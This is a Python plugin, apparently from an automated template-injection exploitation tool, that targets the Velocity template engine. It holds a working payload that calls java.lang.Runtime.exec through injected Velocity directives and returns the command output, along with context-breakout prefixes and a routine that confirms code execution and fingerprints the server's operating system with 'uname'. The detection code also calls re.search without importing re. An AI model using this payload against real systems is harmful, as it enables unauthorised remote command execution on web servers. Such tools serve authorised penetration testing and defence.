from utils.loggers import log
from core.plugin import Plugin
from core import languages
from utils import rand
from utils.strings import quote

class Velocity(Plugin):

    actions = {
        'render' : {
            'render': '#set($c=%(code)s)\n${c}\n',
            'header': '\n#set($h=%(header)s)\n${h}\n',
            'trailer': '\n#set($t=%(trailer)s)\n${t}\n'
        },
        'execute' : {

           # I've tested the techniques described in this article
           # http://blog.portswigger.net/2015/08/server-side-template-injection.html
           # for it didn't work. Still keeping the check active to cover previous
           # affected versions.

            'call': 'render',
            'execute': """#set($str=$class.inspect("java.lang.String").type)
    #set($chr=$class.inspect("java.lang.Character").type)
    #set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("%s"))
    $ex.waitFor()
    #set($out=$ex.getInputStream())
    #foreach($i in [1..$out.available()])
    $str.valueOf($chr.toChars($out.read()))
    #end"""
        }
    }

    contexts = [

            # Text context, no closures
            { 'level': 0 },

            { 'level': 1, 'prefix': '%(closure)s)', 'suffix' : '', 'closures' : languages.java_ctx_closures },

            # This catches
            # #if(%s == 1)\n#end
            # #foreach($item in %s)\n#end
            # #define( %s )a#end
            { 'level': 3, 'prefix': '%(closure)s#end#if(1==1)', 'suffix' : '', 'closures' : languages.java_ctx_closures },
            { 'level': 5, 'prefix': '*#', 'suffix' : '#*' },

    ]

    language = 'java'

    def rendered_detected(self):

        payload = '#* comm *#'

        if '' == self.render(payload):

            # Since the render format is pretty peculiar assume
            # engine name if render has been detected.
            self.set('engine', self.plugin.lower())
            self.set('language', self.language)

            expected_rand = str(rand.randint_n(2))
            if expected_rand == self.execute('echo %s' % expected_rand):
                self.set('execute', True)

                os = self.execute("""uname""")
                if os and re.search('^[\w-]+$', os):
                    self.set('os', os)
